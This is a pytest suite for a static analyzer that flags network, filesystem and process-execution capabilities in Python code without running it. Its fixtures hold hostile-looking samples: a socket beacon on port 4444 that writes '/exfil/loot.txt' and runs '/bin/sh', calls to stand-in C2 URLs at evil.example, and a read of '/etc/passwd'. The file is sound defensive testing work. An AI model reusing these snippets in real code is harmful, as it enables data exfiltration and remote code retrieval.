# CUI // SP-CTI
"""Tests for the SIPA capability extractor (sipa-cap-01).

Covers the acceptance criteria for ``tools/integrity/capability_extractor.py``:

  * ``extract(path)`` turns Python source into a normalized capability manifest of
    ``{file_path, function_name, capability_type, evidence, line_start, line_end,
    risk_weight}`` records via the ``ast`` module — never importing/executing the
    target.
  * Phase-1 detectors: ``network_egress`` (socket / http.client / urllib /
    requests / httpx, with host/url literal evidence), ``filesystem`` (open / Path
    read+write / shutil / os, with path + mode evidence), ``process_exec``
    (subprocess / os.system / popen / exec / multiprocessing, with command
    evidence).
  * A **benign** fixture (pure arithmetic / printing) yields zero capabilities.
  * A **malicious** fixture that opens a socket + writes a file + calls subprocess
    yields exactly those three capability types, with the enclosing function name
    and the captured literals.
  * Import aliasing (``import requests as rq``; ``from subprocess import run``) is
    resolved, so renaming an import cannot hide a capability.
  * ``extract_and_persist`` writes the manifest append-only to
    ``integrity_capabilities`` (RLS-aware path, tenant/classification stamped).

SQLite-backed via the shared ``icdev_db`` fixture; no network, no subprocess, and
the fixtures' code is never run — only parsed.
"""
from pathlib import Path

import pytest

from tools.integrity import capability_extractor as cap
from tools.integrity import constants


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture
def db_env(icdev_db, monkeypatch):
    """Point get_connection() at the temp SQLite db."""
    monkeypatch.setenv("ICDEV_DB_PATH", str(icdev_db))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    return icdev_db


_BENIGN_SRC = '''\
"""A perfectly boring module — no network, fs, or process capability."""

import math


def area_of_circle(radius):
    return math.pi * radius * radius


def greet(name):
    message = "hello " + name
    print(message)
    return message
'''

# Opens a socket (network_egress), writes a file (filesystem), and shells out
# (process_exec) — the canonical "three flags" fixture from the task.
_MALICIOUS_SRC = '''\
import socket
import subprocess


def beacon(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 4444))
    with open("/exfil/loot.txt", "w") as fh:
        fh.write("exfil")
    subprocess.run(["/bin/sh", "-c", "id"], shell=False)
    return s
'''


def _write(tmp_path: Path, name: str, src: str) -> Path:
    fp = tmp_path / name
    fp.write_text(src, encoding="utf-8")
    return fp


# --------------------------------------------------------------------------- #
# Benign fixture — no capabilities flagged
# --------------------------------------------------------------------------- #
def test_benign_fixture_yields_no_capabilities(tmp_path):
    fp = _write(tmp_path, "benign.py", _BENIGN_SRC)
    records = cap.extract(str(fp))
    assert records == [], f"benign module should flag nothing, got {records}"


# --------------------------------------------------------------------------- #
# Malicious fixture — socket + file write + subprocess
# --------------------------------------------------------------------------- #
def test_malicious_fixture_flags_three_capability_types(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))

    by_type = {r["capability_type"] for r in records}
    assert "network_egress" in by_type
    assert "filesystem" in by_type
    assert "process_exec" in by_type

    # Every record is fully shaped and every type is a known capability.
    for r in records:
        assert set(r) >= {
            "file_path", "function_name", "capability_type",
            "evidence", "line_start", "line_end", "risk_weight",
        }
        assert r["capability_type"] in constants.CAPABILITY_TYPES
        # Enclosing function tracked.
        assert r["function_name"] == "beacon"
        # Line span is sane.
        assert r["line_start"] >= 1
        assert r["line_end"] >= r["line_start"]


def test_malicious_fixture_captures_evidence_literals(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))

    fs = [r for r in records if r["capability_type"] == "filesystem"]
    assert fs, "expected a filesystem capability for open(..., 'w')"
    open_rec = next(r for r in fs if r["evidence"].get("api") == "open")
    assert open_rec["evidence"]["path"] == "/exfil/loot.txt"
    assert open_rec["evidence"]["mode"] == "w"

    proc = [r for r in records if r["capability_type"] == "process_exec"]
    assert proc, "expected a process_exec capability for subprocess.run"
    assert proc[0]["evidence"]["api"] == "subprocess.run"
    assert "/bin/sh" in proc[0]["evidence"]["command"]

    net = [r for r in records if r["capability_type"] == "network_egress"]
    assert net, "expected a network_egress capability for socket.socket"


def test_risk_weight_matches_constants(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))
    for r in records:
        expected = constants.RISK_WEIGHTS_CAPABILITY[r["capability_type"]]
        assert r["risk_weight"] == expected


# --------------------------------------------------------------------------- #
# Import aliasing — renaming an import cannot hide a capability
# --------------------------------------------------------------------------- #
def test_aliased_imports_are_resolved(tmp_path):
    src = (
        "import requests as rq\n"
        "from subprocess import run as r\n"
        "from urllib.request import urlopen\n"
        "\n"
        "def pull():\n"
        "    rq.get('https://evil.example/c2')\n"
        "    urlopen('http://evil.example/stage2')\n"
        "    r(['curl', 'evil.example'])\n"
    )
    fp = _write(tmp_path, "aliased.py", src)
    records = cap.extract(str(fp))

    apis = {r["evidence"].get("api") for r in records}
    assert "requests.get" in apis        # rq.get resolved
    assert "subprocess.run" in apis      # r(...) resolved
    assert "urllib.request.urlopen" in apis

    net = [r for r in records if r["capability_type"] == "network_egress"]
    urls = {r["evidence"].get("url") for r in net}
    assert "https://evil.example/c2" in urls


# --------------------------------------------------------------------------- #
# Path / shutil / os filesystem coverage
# --------------------------------------------------------------------------- #
def test_pathlib_and_shutil_and_os_filesystem(tmp_path):
    src = (
        "import shutil\n"
        "import os\n"
        "from pathlib import Path\n"
        "\n"
        "def touchy():\n"
        "    Path('/etc/passwd').read_text()\n"
        "    Path('/tmp/out').write_text('x')\n"
        "    shutil.copy('/a', '/b')\n"
        "    os.remove('/tmp/old')\n"
    )
    fp = _write(tmp_path, "fsops.py", src)
    records = cap.extract(str(fp))
    fs = [r for r in records if r["capability_type"] == "filesystem"]
    apis = {r["evidence"].get("api") for r in fs}
    assert "read_text" in apis
    assert "write_text" in apis
    assert "shutil.copy" in apis
    assert "os.remove" in apis

    read_rec = next(r for r in fs if r["evidence"].get("api") == "read_text")
    assert read_rec["evidence"]["mode"] == "r"
    write_rec = next(r for r in fs if r["evidence"].get("api") == "write_text")
    assert write_rec["evidence"]["mode"] == "w"


# --------------------------------------------------------------------------- #
# Directory scan — relative file paths, multiple files
# --------------------------------------------------------------------------- #
def test_extract_directory_tree(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    _write(pkg, "clean.py", _BENIGN_SRC)
    _write(pkg, "dirty.py", _MALICIOUS_SRC)
    # A cache dir that must be skipped.
    cache = pkg / "__pycache__"
    cache.mkdir()
    _write(cache, "ignored.py", _MALICIOUS_SRC)

    records = cap.extract(str(pkg))
    files = {r["file_path"] for r in records}
    assert "dirty.py" in files               # relative to scan root
    assert "clean.py" not in files           # benign contributes nothing
    assert not any("__pycache__" in f for f in files)  # cache excluded


def test_unparseable_file_yields_no_records(tmp_path):
    fp = _write(tmp_path, "broken.py", "def oops(:\n    pass\n")
    assert cap.extract(str(fp)) == []


def test_missing_path_is_graceful(tmp_path):
    assert cap.extract(str(tmp_path / "does_not_exist.py")) == []


# --------------------------------------------------------------------------- #
# Persistence — append-only to integrity_capabilities
# --------------------------------------------------------------------------- #
def _new_assessment(db_env) -> int:
    from tools.db.storage import get_connection
    from tools.integrity.db.init_db import init_db

    conn = get_connection()
    try:
        init_db(conn)
        cur = conn.execute(
            "INSERT INTO integrity_assessments "
            "(source_type, source_ref, mode, status) VALUES (?, ?, ?, ?)",
            ("local", "fixture", "provenance_blind", "quarantine"),
        )
        conn.commit()
        return int(cur.lastrowid)
    finally:
        conn.close()


def _capabilities(aid):
    from tools.db.storage import get_connection

    conn = get_connection()
    try:
        rows = conn.execute(
            "SELECT file_path, function_name, capability_type, evidence, "
            "line_start, line_end, risk_weight "
            "FROM integrity_capabilities WHERE assessment_id = ? ORDER BY id",
            (aid,),
        ).fetchall()
    finally:
        conn.close()
    return [dict(r) for r in rows]


def test_extract_and_persist_writes_capabilities(db_env, tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    aid = _new_assessment(db_env)

    result = cap.extract_and_persist(aid, str(fp))

    assert result["assessment_id"] == aid
    assert result["capabilities_persisted"] >= 3
    assert result["by_type"]["network_egress"] >= 1
    assert result["by_type"]["filesystem"] >= 1
    assert result["by_type"]["process_exec"] >= 1

    rows = _capabilities(aid)
    assert len(rows) == result["capabilities_persisted"]
    types = {r["capability_type"] for r in rows}
    assert {"network_egress", "filesystem", "process_exec"} <= types
    # evidence persisted as JSON text.
    import json

    for r in rows:
        ev = json.loads(r["evidence"])
        assert "api" in ev


def test_extract_and_persist_benign_writes_nothing(db_env, tmp_path):
    fp = _write(tmp_path, "benign.py", _BENIGN_SRC)
    aid = _new_assessment(db_env)
    result = cap.extract_and_persist(aid, str(fp))
    assert result["capabilities_persisted"] == 0
    assert _capabilities(aid) == []
